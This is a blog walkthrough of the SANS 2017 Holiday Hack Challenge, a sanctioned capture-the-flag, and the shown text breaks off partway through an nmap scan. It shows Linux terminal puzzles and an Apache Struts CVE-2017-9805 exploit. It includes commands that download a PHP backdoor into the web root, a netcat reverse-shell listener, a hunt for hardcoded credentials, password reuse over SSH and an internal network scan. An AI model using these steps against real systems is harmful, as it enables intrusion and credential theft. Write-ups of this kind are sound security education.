---
layout: single
title: "SANS 2017 Holiday Hack Challenge"
header:
  overlay_image: hh-banner.png
  caption: "[SANS Holiday Hack Challenge](https://holidayhackchallenge.com/2017/)"
related: true
comments: true
---

{% include toc title="Solutions Index" icon="file-text" %}

Happy Holidays and a Happy New Year 2018 readers! Thanks for joining me today as we go over the [SANS 2016 Holiday Hack Challenge](https://holidayhackchallenge.com/2017/)! And as always, SANS has done an amazing job at making this as fun as possible, while also being very educational!

I also want to give a quick shout out to the amazing Community from the CentralSec Slack Channel and from SANS for always helping everyone out and continuously teaching the community. This is what makes the InfoSec community amazing! 

Just a quick heads up - this is a very comprehensive and long post. I will include an Index for you to be able to jump to a certain portion of the challenge; if you are only looking for solutions.

For others, the challenges are still available to play through - and will be till next year! So if you want to follow along, or give it a go by yourself, then you can start [here](https://holidayhackchallenge.com/2017/)!

## Introduction

### Scope

For this entire challenge, we are authorized to attack ONLY the Letters to Santa system at [l2s.northpolechristmastown.com](https://l2s.northpolechristmastown.com/) AND other systems on the internal 10.142.0.0/24 network that we access through the Letters to Santa system. We are also authorized to download data from [nppd.northpolechristmastown.com](https://nppd.northpolechristmastown.com/), but are not authorized to exploit that machine or any of the North Pole and Beyond puzzler, chat, and video game components of the Holiday Hack Challenge.

### Questions

Once we understand the underlying story and the scope of this challenge, we are then presented with the questions that need to be answered by completing and hacking certain portions of the North Pole Christmas Town Infrastructure.

The following are the questions that need to be answered:

1) Visit the [North Pole and Beyond](https://2017.holidayhackchallenge.com/) at the __Winter Wonder Landing__ Level to collect the first page of The Great Book using a giant snowball. What is the title of that page?

2) Investigate the Letters to Santa application at [https://l2s.northpolechristmastown.com](https://l2s.northpolechristmastown.com/). What is the topic of The Great Book page available in the web root of the server? What is Alabaster Snowball's password?

> For hints associated with this challenge, Sparkle Redberry in the Winconceivable: The Cliffs of Winsanity Level can provide some tips.

3) The North Pole engineering team uses a Windows SMB server for sharing documentation and correspondence. Using your access to the Letters to Santa server, identify and enumerate the SMB file-sharing server. What is the file server share name?

> For hints, please see Holly Evergreen in the Cryokinetic Magic Level.

4) Elf Web Access (EWA) is the preferred mailer for North Pole elves, available internally at __http://mail.northpolechristmastown.com__. What can you learn from The Great Book page found in an e-mail on that server?

> Pepper Minstix provides some hints for this challenge on the There's Snow Place Like Home Level.

5) How many infractions are required to be marked as naughty on Santa's Naughty and Nice List? What are the names of at least six insider threat moles? Who is throwing the snowballs from the top of the North Pole Mountain and what is your proof?

> Minty Candycane offers some tips for this challenge in the North Pole and Beyond.

6) The North Pole engineering team has introduced an Elf as a Service (EaaS) platform to optimize resource allocation for mission-critical Christmas engineering projects at __http://eaas.northpolechristmastown.com__. Visit the system and retrieve instructions for accessing The Great Book page from __C:\greatbook.txt__. Then retrieve The Great Book PDF file by following those directions. What is the title of The Great Book page?

> For hints on this challenge, please consult with Sugarplum Mary in the North Pole and Beyond.

7) Like any other complex SCADA systems, the North Pole uses Elf-Machine Interfaces (EMI) to monitor and control critical infrastructure assets. These systems serve many uses, including email access and web browsing. Gain access to the EMI server through the use of a phishing attack with your access to the EWA server. Retrieve The Great Book page from __C:\GreatBookPage7.pdf__. What does The Great Book page describe?

> Shinny Upatree offers hints for this challenge inside the North Pole and Beyond.

8) Fetch the letter to Santa from the North Pole Elf Database at __http://edb.northpolechristmastown.com__. Who wrote the letter?

> For hints on solving this challenge, please locate Wunorse Openslae in the North Pole and Beyond.

9) Which character is ultimately the villain causing the giant snowball problem. What is the villain's motive?

> To answer this question, you need to fetch at least five of the seven pages of The Great Book and complete the final level of the North Pole and Beyond.

### The North Pole and Beyond

Upon creating an account, logging in, and navigating to the North Pole and Beyond we are presented with more of the underlying story, some instructions and links to the Elf's Twitter accounts. This should help shed some light on the challenges we have.

> As [Sam the Snowman mentioned](https://www.holidayhackchallenge.com/2017/), the North Pole itself is under siege as boulder-sized snowballs cascade down our mountain leaving destruction and mayhem in their wake. Please help us find the source of the snowballs and achieve other objectives along the way.
> 
> To get started, choose [Play](https://2017.holidayhackchallenge.com/game) above and select an available level. Use the available tools to guide the snowball, redirecting it to the yellow exit platform to complete each level. After placing a tool on the scene, click on it and hold it for a second to reposition it in the scene.
> 
> Completing levels will reward you with hints to use in the technical challenges as you work to save Christmas. Keep an eye out for _Great Book_ pages as you solve these puzzles and hacking challenges, submitting the hashes of collected _Great Book_ pages in your [Stocking](https://2017.holidayhackchallenge.com/stocking). You can unlock new levels by completing at least three objectives in each level OR by submitting _Great Book_ page hashes.
> 
> Each level also features a Cranberry Pi terminal challenge, which you can complete to unlock new tools for redirecting snowballs. Click on the Cranberry Pi icon in each level and assist the North Pole elves [Sparkle](https://twitter.com/GlitteryElf), [Bushy](https://twitter.com/GreenestElf), [Holly](https://twitter.com/GreenesterElf), [Pepper](https://twitter.com/PepperyGoodness), [Minty](https://twitter.com/SirMintsALot), [Shinny](https://twitter.com/ClimbALLdaTrees), [Wunorse](https://twitter.com/1Horse1OSSleigh), and [SugarPlum](https://twitter.com/ThePlumSweetest) with command-line skills needed to keep Santa's workshop running. As you complete objectives, you will collect items, hints, and other achievements in your [Stocking](https://2017.holidayhackchallenge.com/stocking).

For us to be able to unlock hints and some of the __Great Book__ pages, we will have to play and beat the Terminal Challenges as well as navigate the snowballs to the exit in each level.

When accessing __North Pole and Beyond__ we can see there are 8 levels total.

<a href="/images/shh1.png"><img src="/images/shh1.png"></a>
[![foo]("/images/ssh1.png")

I suggest beating all the terminal levels and finish the levels before answering the questions since this will provide us with specific hints on what we should do.

All right, now that we know all that - let's get into answering the questions!

## The Great Book: Page 1

### North Pole and Beyond - Winter Wonder Landing

The first page is available at the North Pole and Beyond __Winter Wonder Landing__ level. We must direct the snowball over the First Page to obtain it. But first, let's solve the Cranberry Pi Challenge.

#### Terminal Challenge:

Upon accessing the Terminal we are presented with the following output:

```console
                                 |
                               \ ' /
                             -- (*) --
                                >*<
                               >0<@<
                              >>>@<<*
                             >@>*<0<<<
                            >*>>@<<<@<<
                           >@>>0<<<*<<@<
                          >*>>0<<@<<<@<<<
                         >@>>*<<@<>*<<0<*<
           \*/          >0>>*<<@<>0><<*<@<<
       ___\\U//___     >*>>@><0<<*>>@><*<0<<
       |\\ | | \\|    >@>>0<*<0>>@<<0<<<*<@<<  
       | \\| | _(UU)_ >((*))_>0><*<0><@<<<0<*<
       |\ \| || / //||.*.*.*.|>>@<<*<<@>><0<<<
       |\\_|_|&&_// ||*.*.*.*|_\\db//_               
       """"|'.'.'.|~~|.*.*.*|     ____|_
           |'.'.'.|   ^^^^^^|____|>>>>>>|
           ~~~~~~~~         '""""`------'
My name is Bushy Evergreen, and I have a problem for you.
I think a server got owned, and I can only offer a clue.
We use the system for chat, to keep toy production running.
Can you help us recover from the server connection shunning?
Find and run the elftalkd binary to complete this challenge.
elf@46c21c345002:~$ 
```

Alright, it seems that we need to start the __elftalkd__ binary - but first we need to find it. It can't be that hard!

Let's try running the [find](https://linux.die.net/man/1/find) command against the binary name to find it.

```console
elf@46c21c345002:~$ find / -name "elftalkd"
bash: /usr/local/bin/find: cannot execute binary file: Exec format error
```

So we're out of luck there as the find command seem to be corrupted. At this point what we can do is utilize the `ls` and `grep` commands to recursively look for the __elftalkd__ binary.

```console
elf@46c21c345002:~$ ls -la -R / | grep elftalkd
ls: cannot open directory '/proc/tty/driver': Permission denied
ls: cannot open directory '/root': Permission denied
-rwxr-xr-x 1 root root 7385168 Dec  4 14:29 elftalkd
ls: cannot open directory '/var/cache/apt/archives/partial': Permission denied
ls: cannot open directory '/var/cache/ldconfig': Permission denied
ls: cannot open directory '/var/lib/apt/lists/partial': Permission denied
```

So we can't read __proc__ or __root__ and it seems we don't have anything in __var__, but we do thee that the __elftalkd__ binary was successfully found from the base directory. Let's see if the binary is somewhere in the __run__ directory.

```console
elf@46c21c345002:~$ ls -la -R /run | grep elftalkd
-rwxr-xr-x 1 root root 7385168 Dec  4 14:29 elftalkd
```

Perfect, we found the directory where the file is stored. Let's navigate to it and find the binary that we need to run.

```console
elf@46c21c345002:~$ ls -la /run
total 24
drwxr-xr-x 1 root root 4096 Dec  4 14:32 .
drwxr-xr-x 1 root root 4096 Jan 12 01:15 ..
drwxr-xr-x 1 root root 4096 Dec  4 14:32 elftalk
drwxrwxrwt 2 root root 4096 Nov 14 13:48 lock
drwxr-xr-x 2 root root 4096 Nov 14 13:48 mount
drwxr-xr-x 1 root root 4096 Nov 17 21:59 systemd
-rw-rw-r-- 1 root utmp    0 Nov 14 13:48 utmp
elf@46c21c345002:~$ cd /run
elf@46c21c345002:/run$ cd elftalk
elf@46c21c345002:/run/elftalk$ ls -la
total 12
drwxr-xr-x 1 root root 4096 Dec  4 14:32 .
drwxr-xr-x 1 root root 4096 Dec  4 14:32 ..
drwxr-xr-x 1 root root 4096 Dec  4 14:32 bin
elf@46c21c345002:/run/elftalk$ cd bin
elf@46c21c345002:/run/elftalk/bin$ ls -la
total 7224
drwxr-xr-x 1 root root    4096 Dec  4 14:32 .
drwxr-xr-x 1 root root    4096 Dec  4 14:32 ..
-rwxr-xr-x 1 root root 7385168 Dec  4 14:29 elftalkd
```

From here, just execute the binary and we are done!

```console
elf@46c21c345002:/run/elftalk/bin$ ./elftalkd

        Running in interactive mode

        --== Initializing elftalkd ==--
Initializing Messaging System!
Nice-O-Meter configured to 0.90 sensitivity.
Acquiring messages from local networks...


--== Initialization Complete ==--

      _  __ _        _ _       _ 
     | |/ _| |      | | |     | |
  ___| | |_| |_ __ _| | | ____| |
/ _ \ |  _| __/ _` | | |/ / _` |
|  __/ | | | || (_| | |   < (_| |
\___|_|_|  \__\__,_|_|_|\_\__,_|

-*> elftalkd! <*-
Version 9000.1 (Build 31337) 
By Santa Claus & The Elf Team
Copyright (C) 2017 NotActuallyCopyrighted. No actual rights reserved.
Using libc6 version 2.23-0ubuntu9
LANG=en_US.UTF-8
Timezone=UTC

Commencing Elf Talk Daemon (pid=6021)... done!
Background daemon...
```

#### Obtaining Page 1:

Once we complete the CranberyPI Terminal challenge, we are able to unlock the "__Convery Belt__" tool, which can be used to re-direct the snowball across the Great Book Page.


<a href="https://jhalon.github.io/images/shh2.png"><img src="https://jhalon.github.io/images/shh2.png"></a>

Once you obtain the Great Book Page in the __Winter Wonder Landing__ level, you will be able to see it in your __Stocking__.

<a href="https://jhalon.github.io/images/shh3.png"><img src="https://jhalon.github.io/images/shh3.png"></a>

<a href="https://jhalon.github.io/images/shh4.png"><img src="https://jhalon.github.io/images/shh4.png"></a>

#### Answer #1:

Q: What is the title of that page?

A: __About This Book...__

## The Great Book: Page 2

### North Pole and Beyond - Winconceivable: The Cliffs of Winsanity

#### Terminal Challenge:

Upon accessing CanberryPI Terminal in the __Winconceivable: The Cliffs of Winsanity__ level we are presented with the following:

```console
                ___,@
               /  <
          ,_  /    \  _,
      ?    \`/______\`/
   ,_(_).  |; (e  e) ;|
    \___ \ \/\   7  /\/    _\8/_
        \/\   \'=='/      | /| /|
         \ \___)--(_______|//|//|
          \___  ()  _____/|/_|/_|
             /  ()  \    `----'
            /   ()   \
           '-.______.-'
   jgs   _    |_||_|    _
        (@____) || (____@)
         \______||______/
My name is Sparkle Redberry, and I need your help.
My server is atwist, and I fear I may yelp.
Help me kill the troublesome process gone awry.
I will return the favor with a gift before nigh.
Kill the "santaslittlehelperd" process to complete this challenge.

elf@f0e40bc3622f:~$
```

So from the get-go it seems Sparkle is having an issue killing the __santaslittlehelperd__ process. If we take a look at [Sparkle's Twitter](https://twitter.com/GlitteryElf) we are presented with her issue, and a few hints on what we can use to kill the process.

<a href="https://jhalon.github.io/images/shh5.png"><img src="https://jhalon.github.io/images/shh5.png"></a>

Alright, with those hints in the back of our mind, let's run `ps -ef` to see what processes are running and what [PID](http://www.linfo.org/pid.html) is associated to each one of them.

```console
elf@f0e40bc3622f:~$ ps -ef
UID        PID  PPID  C STIME TTY          TIME CMD
elf          1     0  0 01:24 pts/0    00:00:00 /bin/bash /sbin/init
elf          8     1  0 01:24 pts/0    00:00:00 /usr/bin/santaslittlehelperd
elf         11     1  1 01:24 pts/0    00:00:00 /sbin/kworker
elf         12     1  0 01:24 pts/0    00:00:00 /bin/bash
elf         18    11  4 01:24 pts/0    00:00:00 /sbin/kworker
elf         32    12  0 01:24 pts/0    00:00:00 ps -ef
```

Okay, great. We can see that the __santaslittlehelperd__ process is currently running with the PID of __8__. Let's try using the [kill](https://linux.die.net/man/1/kill) command along with the PID to attempt and stop the process.

```console
elf@f0e40bc3622f:~$ kill -9 8
elf@f0e40bc3622f:~$ ps -ef
UID        PID  PPID  C STIME TTY          TIME CMD
elf          1     0  0 01:24 pts/0    00:00:00 /bin/bash /sbin/init
elf          8     1  0 01:24 pts/0    00:00:00 /usr/bin/santaslittlehelperd
elf         11     1  0 01:24 pts/0    00:00:00 /sbin/kworker
elf         12     1  0 01:24 pts/0    00:00:00 /bin/bash
elf         18    11  1 01:24 pts/0    00:00:00 /sbin/kworker
elf         43    12  0 01:24 pts/0    00:00:00 ps -ef
```

Guess that won't work.

Looking back at Sparkle's Tweet, we can see that she mentions something about a malicious [alias](https://linux.die.net/man/1/alias). So let's see what aliases we currently have on the terminal.

```console
elf@f0e40bc3622f:~$ alias
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'
alias egrep='egrep --color=auto'
alias fgrep='fgrep --color=auto'
alias grep='grep --color=auto'
alias kill='true'
alias killall='true'
alias l='ls -CF'
alias la='ls -A'
alias ll='ls -alF'
alias ls='ls --color=auto'
alias pkill='true'
alias skill='true'
```

Well that would explain why our kill command didn't work. Kill is set to `true` so it's not going to execute the way it's intended to. After looking at the Tweet again, I began researching about [xarg](https://linux.die.net/man/1/xarg) and how to use it to kill a process.

After some time, I came across the following link: [PS-EF w/ XARGS to Kill Process](http://www.commandlinefu.com/commands/view/1138/ps-ef-grep-process-grep-v-grep-awk-print-2-xargs-kill-9).

After reading that post, I began to execute the commands one by one to see the output. Overall we are just grabbing the PID of the __santaslittlehelperd__ binary, and utilizing xargs to kill it.

```console
elf@f0e40bc3622f:~$ ps -ef | grep santaslittlehelperd
elf          8     1  0 01:24 pts/0    00:00:00 /usr/bin/santaslittlehelperd
elf         66    12  0 01:25 pts/0    00:00:00 grep --color=auto santaslittlehelperd
elf@f0e40bc3622f:~$ ps -ef | grep santaslittlehelperd | grep -v grep
elf          8     1  0 01:24 pts/0    00:00:00 /usr/bin/santaslittlehelperd
elf@f0e40bc3622f:~$ ps -ef | grep santaslittlehelperd | grep -v grep | awk '{print $2}'
8
elf@f0e40bc3622f:~$ ps -ef | grep santaslittlehelperd | grep -v grep | awk '{print $2}' | xargs kill -9
```

Once that's done, let's see if the process is in fact killed...

```console
elf@f0e40bc3622f:~$ ps -ef
UID        PID  PPID  C STIME TTY          TIME CMD
elf          1     0  0 01:24 pts/0    00:00:00 /bin/bash /sbin/init
elf         12     1  0 01:24 pts/0    00:00:00 /bin/bash
elf        115    12  0 01:25 pts/0    00:00:00 ps -ef
```

Perfect! The process has been successfully killed! Upon completing the Terminal Challenge and directing the Snowball to the exit, we are presented with a new tool, and some hints from Sparkle

<a href="https://jhalon.github.io/images/shh6.png"><img src="https://jhalon.github.io/images/shh6.png"></a>

<a href="https://jhalon.github.io/images/shh7.png"><img src="https://jhalon.github.io/images/shh7.png"></a>

### North Pole Christmas Town Infrastructure

#### Letters to Santa App:

Upon accessing the [Letters to Santa](https://l2s.northpolechristmastown.com/) Application, we are presented with the following screen.

<a href="https://jhalon.github.io/images/shh8.png"><img src="https://jhalon.github.io/images/shh8.png"></a>

Taking a look at the source code of the page, we spot a rather interesting comment about a "Development Version", along with a link to that site.

<a href="https://jhalon.github.io/images/shh9.png"><img src="https://jhalon.github.io/images/shh9.png"></a>

Navigating to the website, we are automatically redirected to the __order.xhtml__ page, and can see that it's a Toy Request Form.

<a href="https://jhalon.github.io/images/shh10.png"><img src="https://jhalon.github.io/images/shh10.png"></a>

Inspecting the source code for that page, also reveals some very important information... the page is running the Apache Struts Framework!

<a href="https://jhalon.github.io/images/shh11.png"><img src="https://jhalon.github.io/images/shh11.png"></a>

At this point I remembered that SANS wrote a great post on "[Why You Need the Skills to Tinker with Publicly Released Exploit Code](https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code)" which included the modification of the The Apache Struts 2 REST Plugin XStream RCE ([CVE-2017-9805](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/struts2_rest_xstream.rb)) Exploit Code.

Toward the end of the article Chris Davis provides us a link to his recoded exploit code for CVE-2017-9805 - https://github.com/chrisjd20/cve-2017-9805.py

After copying over the exploit to my Kali Machine, I ran it via python to see the usage and arguments needed.

<a href="https://jhalon.github.io/images/shh12.png"><img src="https://jhalon.github.io/images/shh12.png"></a>

Interestingly enough, in the URL parameter we see that the example points to a server with an ending of "__orders.xhtml__"! Which is the same page we were redirected to when navigating to the dev page "https://dev.northpolechristmastown.com". 

Let's see if the script works by trying to execute the `whoami` command and piping the output it a file called "test.txt" which will be saved in the __/var/www/html__ directory.

```console
root@kali:~# python cve-2017-9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c "whoami > /var/www/html/test.txt"
[+] Encoding Command
[+] Building XML object
[+] Placing command in XML object
[+] Converting Back to String
[+] Making Post Request with our payload
[+] Payload executed
```

We see that the exploit executed without any issues. So from here, let's navigate to http://l2s.northpolechristmastown.com/test.txt and see if we indeed were able to exploit Apache Struts.

<a href="https://jhalon.github.io/images/shh13.png"><img src="https://jhalon.github.io/images/shh13.png"></a>

Nice, we are able to execute commands on the server! At this point I wanted to get a PHP Shell onto the server, so I opted to use this following simple one line PHP Script found on GitHub - https://gist.github.com/sente/4dbb2b7bdda2647ba80b.

From here, I executed the following command to download the RAW PHP shell to the server and save it as __kkb\_shell.php__.

```console
root@kali:~# python cve-2017-9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c "wget https://gist.githubusercontent.com/sente/4dbb2b7bdda2647ba80b/raw/31218294e74361df73215b44a219af3b95945618/Simple-Backdoor-One-Liner.php -O /var/www/html/kkb_shell.php"
[+] Encoding Command
[+] Building XML object
[+] Placing command in XML object
[+] Converting Back to String
[+] Making Post Request with our payload
[+] Payload executed
```

Okay, so the command executed successfully. Let's test the PHP shell by trying to execute the `ls -la` command to list all the files in the current working directory.

<a href="https://jhalon.github.io/images/shh14.png"><img src="https://jhalon.github.io/images/shh14.png"></a>

Perfect! So we can execute commands via the PHP shell. At this point, we see that the second page of the Great Book is located in the web directory. 

Simply navigating to http://l2s.northpolechristmastown.com/GreatBookPage2.pdf will allow us to see and download Page 2.

<a href="https://jhalon.github.io/images/shh17.png"><img src="https://jhalon.github.io/images/shh17.png"></a>

Now that we got the 2nd page of the Great Book, we have to find Alabaster Snowballs password.

Jeff McJunkin wrote a good post for SANS about [Putting My Zero Cents In: Using the Free Tier on Amazon Web Services (EC2)](https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2).

The post goes through the process of setting up a Free Amazon EC2 Instance in AWS, which will seriously help you during pentests like this by providing you a public IP.

After reading the post I opted to create an EC2 instance and utilized my PHP Shell to create a Reverse Shell back to my EC2 instance.

<a href="https://jhalon.github.io/images/shh15.png"><img src="https://jhalon.github.io/images/shh15.png"></a>

After running the command, we get a successful reverse shell back to our EC2 instance.

```console
ubuntu@ip-172-31-24-12:~$ sudo nc -nlvp 80
Listening on [0.0.0.0] (family 0, port 80)
Connection from [35.190.140.65] port 80 [tcp/*] accepted (family 2, sport 59800)
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
whoami
www-data
```

<a href="https://jhalon.github.io/images/shh16.png"><img src="https://jhalon.github.io/images/shh16.png"></a>

Now that we have shell access to the server, let's spawn up an Interactive [TTY Shell](https://netsec.ws/?p=337) by using Python.

```console
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@hhc17-apache-struts2:~/html$
```

Knowing that we need to find Alabaster Snowballs password, I utilized the `find` command to look for anything that matched "__struts.xml__" hoping that something might be hardcoded in the Apache Struts directory.

```console
www-data@hhc17-apache-struts2:~/html$ find / -name "struts.xml" 2>/dev/null
find / -name "struts.xml" 2>/dev/null
/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/struts.xml
/opt/apache-tomcat/webapps/ROOT/WEB-INF/src/java/struts.xml
```

Perfect, we now know where Apache Struts is located. Let's go ahead and look for any files with the name "__alabaster__" in them, located in the Apache Struts directory.

```console
www-data@hhc17-apache-struts2:~/html$ grep -rnw '/opt/apache-tomcat/' -e 'alabaster' 2>/dev/null
/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class:3:            final String username = "alabaster_snowball";
```

So it seems that we found alabaster's username in a file called __OrderMySql.class__. Let's see if there is a password in here as well.

```console
www-data@hhc17-apache-struts2:~/html$ cat /opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class 
<-INF/classes/org/demo/rest/example/OrderMySql.class
    public class Connect {
            final String host = "localhost";
            final String username = "alabaster_snowball";
            final String password = "stream_unhappy_buy_loss";   
            String connectionURL = "jdbc:mysql://" + host + ":3306/db?user=;password=";
            Connection connection = null;
            Statement statement = null;
```

Awesome, so we found the password `stream_unhappy_buy_loss`. Sparkle said something about password reuse in her hints, so let's try to SSH into the Letters to Santa system by using Alabaster's username and the found password.

```console
root@kali:~/HH# ssh alabaster_snowball@35.190.140.65
alabaster_snowball@35.190.140.65's password: 
alabaster_snowball@hhc17-apache-struts2:/tmp/asnow.mUMEH44K1qfu6InxlP2pXWdK$ 
```

Great - we found Alabaster's password, and were able to answer all the questions for #2.

#### Answer #2:

Q: What is the topic of The Great Book page available in the web root of the server? 

A: __On the Topic of Flying Animals__

Q: What is Alabaster Snowball's password?

A: __stream\_unhappy\_buy\_loss__

## The Great Book: Page 3

### North Pole and Beyond - Cryokinetic Magic

#### Terminal Challenge:

Upon accessing the CranPI Terminal we are presented with the following:

```console
                     ___
                    / __'.     .-"""-.
              .-""-| |  '.'.  / .---. \
             / .--. \ \___\ \/ /____| |
            / /    \ `-.-;-(`_)_____.-'._
           ; ;      `.-" "-:_,(o:==..`-. '.         .-"-,
           | |      /       \ /      `\ `. \       / .-. \
           \ \     |         Y    __...\  \ \     / /   \/
     /\     | |    | .--""--.| .-'      \  '.`---' /
     \ \   / /     |`        \'   _...--.;   '---'`
      \ '-' / jgs  /_..---.._ \ .'\\_     `.
       `--'`      .'    (_)  `'/   (_)     /
                  `._       _.'|         .'
                     ```````    '-...--'`
My name is Holly Evergreen, and I have a conundrum.
I broke the candy cane striper, and I'm near throwing a tantrum.
Assembly lines have stopped since the elves can't get their candy cane fix.
We hope you can start the striper once again, with your vast bag of tricks.
Run the CandyCaneStriper executable to complete this challenge.

elf@ada271f92830:~$
```

Alright, from the looks of it, we need to start the Candy Cane Stripper program which seems to be broken.

First of all, let's find the program and see what permissions are assigned to it.

```console
elf@ada271f92830:~$ ls -la
total 68
drwxr-xr-x 1 elf  elf   4096 Dec 15 20:00 .
drwxr-xr-x 1 root root  4096 Dec  5 19:31 ..
-rw-r--r-- 1 elf  elf    220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 root root  3143 Dec 15 19:59 .bashrc
-rw-r--r-- 1 elf  elf    655 May 16  2017 .profile
-rw-r--r-- 1 root root 45224 Dec 15 19:59 CandyCaneStriper
```

So the __CandyCaneStripper__ binary is what we need to run, and it seems we only have read permissions. We can try running [chmod]() against the binary, and assign executable permission... but I doubt that will work.

```console
elf@ada271f92830:~$ chmod +x CandyCaneStriper 
elf@ada271f92830:~$ ls -la
total 68
drwxr-xr-x 1 elf  elf   4096 Dec 15 20:00 .
drwxr-xr-x 1 root root  4096 Dec  5 19:31 ..
-rw-r--r-- 1 elf  elf    220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 root root  3143 Dec 15 19:59 .bashrc
-rw-r--r-- 1 elf  elf    655 May 16  2017 .profile
-rw-r--r-- 1 root root 45224 Dec 15 19:59 CandyCaneStriper
```

Yah I was right, it's not going to be so easy.

Looking at Holly's Twitter, we see a tweet about how chmod was removed from her system, which would explain why we weren't able to assign the executable bit to the binary.

<a href="https://jhalon.github.io/images/shh18.png"><img src="https://jhalon.github.io/images/shh18.png"></a>

At the end of the tweet we see a link on how to [execute a Linux binary without the execute permission bit being set](https://superuser.com/questions/341439/can-i-execute-a-linux-binary-without-the-execute-permission-bit-being-set).

The post states that we can use __/lib/ld*__ as an ELF interpreter to execute binary files. 

So before we try to do that, let's copy over the __CandyCaneStripper__ binary to the __/tmp__ folder.

```console
elf@ada271f92830:~$ cp CandyCaneStriper /tmp/
elf@ada271f92830:~$ cd /tmp
elf@ada271f92830:/tmp$ ls -la
total 56
drwxrwxrwt 1 root root  4096 Jan 12 01:19 .
drwxr-xr-x 1 root root  4096 Jan 12 01:18 ..
-rw-r--r-- 1 elf  elf  45224 Jan 12 01:19 CandyCaneStriper
```

Once that's done, let's utilize __ld-2.23.so__ from the __/lib__ directory to execute out binary.

```console
elf@ada271f92830:/tmp$ /lib/x86_64-linux-gnu/ld-2.23.so /tmp/CandyCaneStriper 
                   _..._
                 .'\\ //`,      
                /\\.'``'.=",
               / \/     ;==|
              /\\/    .'\`,`
             / \/     `""`
            /\\/
           /\\/
          /\ /
         /\\/
        /`\/
        \\/
         `
The candy cane striping machine is up and running!
```

Awesome, we were able to successfully execute our binary file, and competed the terminal challenge! After that, go ahead and redirect the snowball to the exit to unlock extra hints for future challenges.

<a href="https://jhalon.github.io/images/shh19.png"><img src="https://jhalon.github.io/images/shh19.png"></a>

<a href="https://jhalon.github.io/images/shh20.png"><img src="https://jhalon.github.io/images/shh20.png"></a>

### North Pole Christmas Town Infrastructure

#### Windows SMB Server:

For this challenge, we need to identify and enumerate a SMB file-sharing server on the internal network.

Holly actually provides us a very good hint on detecting certain ports via Nmap, which we can utilize for identifying our SMB-Server.

<a href="https://jhalon.github.io/images/shh21.png"><img src="https://jhalon.github.io/images/shh21.png"></a>

First of all, we need to find out the Internal IP range for the Christmas Town Infrastructure. 

If you still have a reverse shell, or a PHP shell on the Letters to Santa server, run __ifconfig__ to find the current internal IP.

```console
www-data@hhc17-apache-struts2:~/html$ ifconfig
ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1460
        inet 10.142.0.11  netmask 255.255.255.255  broadcast 10.142.0.11
        ether 42:01:0a:8e:00:0b  txqueuelen 1000  (Ethernet)
        RX packets 13641321  bytes 4028153487 (3.7 GiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 23636718  bytes 8818057385 (8.2 GiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Now that we know the internal IP address of the server, we can assume that the internal subnet would be __10.142.0.0/24__. So let's go ahead and scan that IP range with Nmap while utilizing the `-PS` command to scan for TCP/445 - or SMB.

```console
alabaster_snowball@hhc17-apache-struts2:/tmp/asnow.mUMEH44K1qfu6InxlP2pXWdK$ nmap -sV -PS445 10.142.0.0/24

Starting Nmap 7.40 ( https://nmap.org ) at 2017-12-28 22:37 UTC
Nmap scan report for hhc17-l2s-proxy.c.holidayhack2017.internal (10.142.0.2)
Host is up (0.00013s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
80/tcp   open  http     nginx 1.10.3
443/tcp  open  ssl/http nginx 1.10.3
2222/tcp open  ssh      OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for hhc17-apache-struts1.c.holidayhack2017.internal (10.142.0.3)
Host is up (0.000095s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
80/tcp open  http    nginx 1.10.3
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for mail.northpolechristmastown.com (10.142.0.5)
Host is up (0.00016s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
25/tcp   open  smtp    Postfix smtpd
80/tcp   open  http    nginx 1.10.3 (Ubuntu)
143/tcp  open  imap    Dovecot imapd
2525/tcp open  smtp    Postfix smtpd
3000/tcp open  http    Node.js Express framework
Service Info: Host:  mail.northpolechristmastown.com; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for edb.northpolechristmastown.com (10.142.0.6)
Host is up (0.00015s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
80/tcp   open  http    nginx 1.10.3
389/tcp  open  ldap
8080/tcp open  http    Werkzeug httpd 0.12.2 (Python 2.7.13)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port389-TCP:V=7.40%I=7%D=12/28%Time=5A457237%P=x86_64-pc-linux-gnu%r(LD
SF:APSearchReq,83,"0s\x02\x01\x07dn\x04\x000j0\x1b\x04\x14supportedLDAPVer
SF:sion1\x03\x04\x0130\x1a\x04\x0enamingContexts1\x08\x04\x06dc=com0/\x04\
SF:x12supportedExtension1\x19\x04\x171\.3\.6\.1\.4\.1\.4203\.1\.11\.10\x0c
